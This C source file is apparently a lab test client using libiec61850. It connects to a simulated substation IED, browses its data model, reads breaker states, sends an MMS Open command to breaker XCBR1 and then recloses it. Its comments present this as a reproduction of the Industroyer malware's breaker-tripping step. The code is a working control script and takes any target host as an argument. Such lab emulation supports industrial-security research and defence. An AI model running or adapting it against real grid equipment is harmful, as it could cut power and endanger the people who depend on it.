/*
 * breaker_control_test.c
 * ======================
 * 遮断器の制御テスト用 MMS クライアント
 *
 * substation_server に接続し、以下を実行する:
 *   1. XCBR1 の現在位置を読み取り
 *   2. XCBR1 に Open コマンドを送信（Industroyer の動作を模擬）
 *   3. 変更後の位置を読み取り
 *   4. MMXU1 の電流値を確認（Open 後は 0A になるはず）
 *
 * ビルド:
 *   gcc -o breaker_control_test breaker_control_test.c \
 *       -I<libiec61850>/src/inc -I<libiec61850>/hal/inc \
 *       -L<libiec61850>/build/src -liec61850 -lhal -lpthread
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "iec61850_client.h"
#include "hal_thread.h"

static void print_dbpos(int val)
{
    switch (val) {
        case 0: printf("intermediate-state"); break;
        case 1: printf("OFF (Open)"); break;
        case 2: printf("ON (Closed)"); break;
        case 3: printf("bad-state"); break;
        default: printf("unknown(%d)", val); break;
    }
}

int main(int argc, char **argv)
{
    const char *hostname = "192.168.56.10";
    int port = 102;

    if (argc > 1) hostname = argv[1];
    if (argc > 2) port = atoi(argv[2]);

    printf("============================================================\n");
    printf("  Breaker Control Test (Industroyer OPC DA Module Analog)\n");
    printf("============================================================\n");
    printf("  Target: %s:%d\n", hostname, port);
    printf("============================================================\n\n");

    IedClientError error;

    /* ------------------------------------------------------------ */
    /*  Phase 1: 接続                                                */
    /* ------------------------------------------------------------ */
    IedConnection con = IedConnection_create();
    IedConnection_connect(con, &error, hostname, port);

    if (error != IED_ERROR_OK) {
        fprintf(stderr, "[-] Connection failed (error=%d)\n", error);
        IedConnection_destroy(con);
        return 1;
    }
    printf("[+] Connected to IED at %s:%d\n\n", hostname, port);

    /* ------------------------------------------------------------ */
    /*  Phase 2: データモデルの探索（Industroyer Phase 3 に相当）     */
    /* ------------------------------------------------------------ */
    printf("[Phase 2] Browsing data model...\n");

    /* 論理デバイスの列挙 */
    LinkedList deviceList = IedConnection_getLogicalDeviceList(con, &error);
    if (deviceList != NULL) {
        LinkedList entry = LinkedList_getNext(deviceList);
        while (entry != NULL) {
            const char *ldName = (const char *)LinkedList_getData(entry);
            printf("  Logical Device: %s\n", ldName);

            /* 論理ノードの列挙 */
            LinkedList lnList = IedConnection_getLogicalDeviceDirectory(
                con, &error, ldName);
            if (lnList != NULL) {
                LinkedList lnEntry = LinkedList_getNext(lnList);
                while (lnEntry != NULL) {
                    const char *lnName = (const char *)LinkedList_getData(lnEntry);
                    printf("    LN: %s\n", lnName);
                    lnEntry = LinkedList_getNext(lnEntry);
                }
                LinkedList_destroy(lnList);
            }
            entry = LinkedList_getNext(entry);
        }
        LinkedList_destroy(deviceList);
    }
    printf("\n");

    /* ------------------------------------------------------------ */
    /*  Phase 3: 遮断器の現在状態を読み取り                          */
    /* ------------------------------------------------------------ */
    printf("[Phase 3] Reading breaker states...\n");

    /* XCBR1 */
    MmsValue *xcbr1_pos = IedConnection_readObject(
        con, &error, "CBIED/XCBR1.Pos.stVal", IEC61850_FC_ST);
    if (xcbr1_pos != NULL) {
        int pos = MmsValue_toInt32(xcbr1_pos);
        printf("  XCBR1.Pos.stVal = %d  → ", pos);
        print_dbpos(pos);
        printf("\n");
        MmsValue_delete(xcbr1_pos);
    }

    /* XCBR2 */
    MmsValue *xcbr2_pos = IedConnection_readObject(
        con, &error, "CBIED/XCBR2.Pos.stVal", IEC61850_FC_ST);
    if (xcbr2_pos != NULL) {
        int pos = MmsValue_toInt32(xcbr2_pos);
        printf("  XCBR2.Pos.stVal = %d  → ", pos);
        print_dbpos(pos);
        printf("\n");
        MmsValue_delete(xcbr2_pos);
    }

    /* XSWI1 */
    MmsValue *xswi1_pos = IedConnection_readObject(
        con, &error, "CBIED/XSWI1.Pos.stVal", IEC61850_FC_ST);
    if (xswi1_pos != NULL) {
        int pos = MmsValue_toInt32(xswi1_pos);
        printf("  XSWI1.Pos.stVal = %d  → ", pos);
        print_dbpos(pos);
        printf("\n");
        MmsValue_delete(xswi1_pos);
    }

    /* 電流値 */
    MmsValue *current_a = IedConnection_readObject(
        con, &error, "CBIED/MMXU1.A.phsA.cVal.mag.f", IEC61850_FC_MX);
    if (current_a != NULL) {
        float val = MmsValue_toFloat(current_a);
        printf("  MMXU1.A.phsA = %.1f A\n", val);
        MmsValue_delete(current_a);
    }
    printf("\n");

    /* ------------------------------------------------------------ */
    /*  Phase 4: 遮断器 XCBR1 に Open コマンドを送信                 */
    /*           ★ Industroyer の攻撃動作に相当                      */
    /* ------------------------------------------------------------ */
    printf("==========================================================\n");
    printf("[Phase 4] Sending OPEN command to XCBR1...\n");
    printf("          (This is what Industroyer did)\n");
    printf("==========================================================\n");

    ControlObjectClient control = ControlObjectClient_create(
        "CBIED/XCBR1.Pos", con);

    if (control != NULL) {
        ControlObjectClient_setOrigin(control, NULL, CONTROL_ORCAT_REMOTE_CONTROL);

        /* ctlVal = false → Open (遮断器を開放) */
        MmsValue *ctlVal = MmsValue_newBoolean(false);

        if (ControlObjectClient_operate(control, ctlVal, 0 /* operTime */)) {
            printf("[+] OPEN command sent successfully!\n");
        } else {
            printf("[-] OPEN command failed\n");
        }

        MmsValue_delete(ctlVal);
        ControlObjectClient_destroy(control);
    } else {
        printf("[-] Failed to create control object\n");
    }

    /* 1秒待って結果を確認 */
    Thread_sleep(1000);
    printf("\n[Phase 4] Reading state after OPEN command...\n");

    xcbr1_pos = IedConnection_readObject(
        con, &error, "CBIED/XCBR1.Pos.stVal", IEC61850_FC_ST);
    if (xcbr1_pos != NULL) {
        int pos = MmsValue_toInt32(xcbr1_pos);
        printf("  XCBR1.Pos.stVal = %d  → ", pos);
        print_dbpos(pos);
        if (pos == 1) {
            printf("  *** BREAKER IS NOW OPEN ***");
        }
        printf("\n");
        MmsValue_delete(xcbr1_pos);
    }

    /* 電流値の確認（Open 後は 0A のはず） */
    Thread_sleep(500);
    current_a = IedConnection_readObject(
        con, &error, "CBIED/MMXU1.A.phsA.cVal.mag.f", IEC61850_FC_MX);
    if (current_a != NULL) {
        float val = MmsValue_toFloat(current_a);
        printf("  MMXU1.A.phsA = %.1f A", val);
        if (val < 1.0f) {
            printf("  (No current flowing - breaker is open)");
        }
        printf("\n");
        MmsValue_delete(current_a);
    }

    /* 動作回数 */
    MmsValue *opCnt = IedConnection_readObject(
        con, &error, "CBIED/XCBR1.OpCnt.stVal", IEC61850_FC_ST);
    if (opCnt != NULL) {
        printf("  XCBR1.OpCnt = %d\n", MmsValue_toInt32(opCnt));
        MmsValue_delete(opCnt);
    }

    printf("\n");

    /* ------------------------------------------------------------ */
    /*  Phase 5: Close コマンドで復旧                                */
    /* ------------------------------------------------------------ */
    printf("[Phase 5] Sending CLOSE command to restore XCBR1...\n");

    control = ControlObjectClient_create("CBIED/XCBR1.Pos", con);
    if (control != NULL) {
        ControlObjectClient_setOrigin(control, NULL, CONTROL_ORCAT_REMOTE_CONTROL);
        MmsValue *ctlVal = MmsValue_newBoolean(true);  /* true = Close */

        if (ControlObjectClient_operate(control, ctlVal, 0)) {
            printf("[+] CLOSE command sent successfully\n");
        }

        MmsValue_delete(ctlVal);
        ControlObjectClient_destroy(control);
    }

    Thread_sleep(1000);

    xcbr1_pos = IedConnection_readObject(
        con, &error, "CBIED/XCBR1.Pos.stVal", IEC61850_FC_ST);
    if (xcbr1_pos != NULL) {
        int pos = MmsValue_toInt32(xcbr1_pos);
        printf("  XCBR1.Pos.stVal = %d  → ", pos);
        print_dbpos(pos);
        printf("\n");
        MmsValue_delete(xcbr1_pos);
    }

    current_a = IedConnection_readObject(
        con, &error, "CBIED/MMXU1.A.phsA.cVal.mag.f", IEC61850_FC_MX);
    if (current_a != NULL) {
        float val = MmsValue_toFloat(current_a);
        printf("  MMXU1.A.phsA = %.1f A", val);
        if (val > 100.0f) {
            printf("  (Current restored)");
        }
        printf("\n");
        MmsValue_delete(current_a);
    }

    /* ------------------------------------------------------------ */
    /*  切断                                                         */
    /* ------------------------------------------------------------ */
    printf("\n[*] Done. Disconnecting.\n");
    IedConnection_close(con);
    IedConnection_destroy(con);

    return 0;
}
